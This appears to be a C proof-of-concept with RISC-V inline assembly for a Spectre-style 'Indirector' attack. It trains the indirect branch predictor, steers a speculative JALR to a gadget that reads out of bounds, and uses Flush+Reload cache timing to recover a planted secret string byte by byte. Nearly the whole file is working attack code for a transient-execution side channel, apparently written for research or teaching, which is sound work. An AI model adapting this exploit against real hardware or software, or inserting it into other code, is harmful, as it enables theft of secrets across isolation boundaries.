#include <stdio.h>
#include <stdint.h>
#include "encoding.h"
#include "cache.h"

#define TRAIN_TIMES 40          // Number of training iterations for the branch predictor
#define ATTACK_SAME_ROUNDS 10   // Number of attack repetitions per secret byte for reliability
#define SECRET_SZ 5             // Size of the secret to leak
#define CACHE_HIT_THRESHOLD 50  // Cache hit time threshold in cycles

uint64_t array1_sz = 10;        // Size of array1
uint64_t passInIdx;             // Index potentially used by the gadget function, calculated during training/attack
uint8_t array1[10] = {1,2,3,4,5,6,7,8,9,10}; // Auxiliary array
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];    // Probe array for cache side-channel
char* secretString = "ThisIsTheSecretString";   // The secret data to be leaked

// External function declarations
extern void want(void);      // Target function for misprediction
extern void gadget(void);    // Gadget function containing the speculative access to array2
asm(".global end\n");       // Export label 'end', likely used within inline asm

int main(void){

    static uint64_t results[256]; // Stores cache hit counts for each possible cache line
    uint64_t start, diff;         // Timing variables
    uint64_t wantAddr = (uint64_t)(&want);    // Address of the 'want' function
    uint64_t gadgetAddr = (uint64_t)(&gadget); // Address of the 'gadget' function
    // Calculate the offset between secretString and array1, used for speculative index calculation
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
    uint64_t randIdx;             // Non-secret index used during training
    uint64_t passInAddr;          // Address passed to the JALR instruction
    uint8_t dummy = 0;            // Dummy variable to prevent optimization

    char guessedSecret[SECRET_SZ + 1]; // Buffer for the recovered secret + null terminator

    printf("Starting Indirector style attack...\n");

    // Iterate through each byte of the secret
    for(uint64_t i = 0; i < SECRET_SZ; i++) {

        // Reset hit counts for the next byte attack
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx) {
            results[cIdx] = 0;
        }

        // Repeat attack rounds for reliability
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound) {

            // Flush the probe array from cache before each round
            flushCache((uint64_t)array2, sizeof(array2));

            // Branch predictor training loop
            for(int64_t j = TRAIN_TIMES; j >= 0; j--){

                    // Conditionally select target address for JALR:
                    // Aim: Train predictor for gadgetAddr, but trigger misprediction to wantAddr
                    // This selects 'wantAddr' when j=0 (attack phase), 'gadgetAddr' otherwise (training phase).
                    passInAddr = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // Check if j=0 (pattern to check high bits)
                    passInAddr = (passInAddr | (passInAddr >> 16));     // Propagate high bits
                    passInAddr = gadgetAddr ^ (passInAddr & (wantAddr ^ gadgetAddr)); // Conditional select

                    // Conditionally select index used by the gadget:
                    // Aim: Use non-secret randIdx during training, secret attackIdx during attack (when j=0)
                    randIdx = atkRound % array1_sz; // Use a non-secret index for training
                    passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // Check if j=0
                    passInIdx = (passInIdx | (passInIdx >> 16));     // Propagate high bits
                    passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // Conditional select

                    // Flush the probe array from cache before each round
                    flushCache((uint64_t)array2, sizeof(array2));

                    // Loop with assumed always-taken branches to fill Branch History Register (BHR)
                    // with 'taken' predictions, potentially biasing future predictions.
                    for(uint64_t k = 0; k < 100; ++k){
                        asm(""); // Empty asm likely still involves a loop branch
                    }

                    // Execute JALR instruction after a delay.
                    // The target address ('passInAddr') and the index used within the gadget ('passInIdx')
                    // are carefully chosen in the preceding steps based on whether this is training (j>0) or attack (j=0).
                    // The complex FP sequence calculates '2', adds it to (addr-2), effectively just delaying execution.
                    asm volatile(
                        "addi %[addr], %[addr], -2\n"   // Start of delay sequence
                        "addi t1, zero, 2\n"
                        "slli t2, t1, 0x4\n"
                        "fcvt.s.lu fa4, t1\n"
                        "fcvt.s.lu fa5, t2\n"
                        "fdiv.s fa5, fa5, fa4\n"
                        "fdiv.s fa5, fa5, fa4\n"
                        "fdiv.s fa5, fa5, fa4\n"
                        "fdiv.s fa5, fa5, fa4\n"
                        "fcvt.lu.s  t2, fa5, rtz\n"
                        "add %[addr], %[addr], t2\n"    // End of delay sequence (addr is unchanged)
                        "jalr x0, %[addr], 0\n"         // Jump to calculated address, discarding return address. This is the misprediction target.
                        "end:\n"                        // Label potentially used by gadget/asm
                        :
                        : [addr] "r" (passInAddr)
                        : "t1", "t2", "fa4", "fa5"); // Clobbered registers

                } // End of training/attack loop (j)

            // Probe phase: Check cache timings for array2 to detect speculative access
            for (uint64_t probe_idx = 0; probe_idx < 256; ++probe_idx){
                    uint8_t* current_addr = &array2[probe_idx * L1_BLOCK_SZ_BYTES];
                    start = rdcycle();
                    dummy &= *current_addr; // Access element, prevent optimization
                    diff = (rdcycle() - start);
                    if (diff < CACHE_HIT_THRESHOLD) {
                        results[probe_idx] += 1; // Increment hit counter if access was fast
                    }
            }
        } // End of attack rounds (atkRound)

        // Find the byte value with the most cache hits
        uint64_t max_hits = 0;
        uint64_t guessed_index = 0;
        for (uint64_t idx = 0; idx < 256; idx++) { // Use 'idx' to avoid shadowing outer 'i'
            if (results[idx] > max_hits) {
                max_hits = results[idx];
                guessed_index = idx;
            }
        }

        // Output the guessed character for this position
        if (max_hits > 0) {
            printf("Attacker guessed character '%c' (0x%02lx) for index %lu with %ld hits.\n",
                   (char)guessed_index, guessed_index, i, max_hits);
        } else {
             printf("No reliable character guess for index %lu (no cache hits detected above threshold).\n", i);
             guessed_index = '?'; // Assign placeholder if unsure
        }

        guessedSecret[i] = (char)guessed_index; // Store the guessed byte

        attackIdx++; // Increment offset for the next secret byte
    } // End of secret byte loop (i)

    guessedSecret[SECRET_SZ] = '\0'; // Null-terminate the string

    printf("\nThe guessed secret is: %s\n", guessedSecret);
    printf("Original secret was: %s\n", secretString);

    return 0;
}